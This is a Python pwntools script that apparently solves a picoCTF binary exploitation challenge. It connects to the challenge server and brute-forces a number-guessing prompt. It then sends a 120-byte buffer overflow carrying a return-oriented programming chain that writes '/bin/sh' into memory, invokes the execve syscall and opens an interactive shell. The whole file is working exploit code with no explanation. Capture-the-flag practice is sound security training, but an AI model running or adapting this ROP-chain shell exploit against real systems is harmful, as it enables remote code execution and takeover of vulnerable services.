from pwn import *

r = remote("shape-facility.picoctf.net" , 53053)

r.recvline()
r.recvline()

for i in range(1 , 101):
    r.recvuntil(b"What number would you like to guess?\n")
    r.sendline(str(i).encode())
    if b"Congrats" in r.recvline():
        r.recvline()
        print(i , "  good")
        break

offset = 120

write = 0x006bc3a0 + 0x100
pop_rax = 0x004005af
pop_rdi = 0x004006a6
pop_rsi = 0x00410b93
pop_rdx = 0x00410602
syscall = 0x0040138c
mov_rax_rdx_ret = 0x0048dd21

payload = b"a"*offset + p64(pop_rax) + p64(write) + p64(pop_rdx) + b"/bin/sh\0" + p64(mov_rax_rdx_ret) + p64(pop_rax) + p64(0x3b) + p64(pop_rdi) + p64(write) + p64(pop_rsi) + p64(0x0) + p64(pop_rdx) + p64(0x0) + p64(syscall)

r.recvuntil(b'Name? ')
r.sendline(payload)
r.interactive()
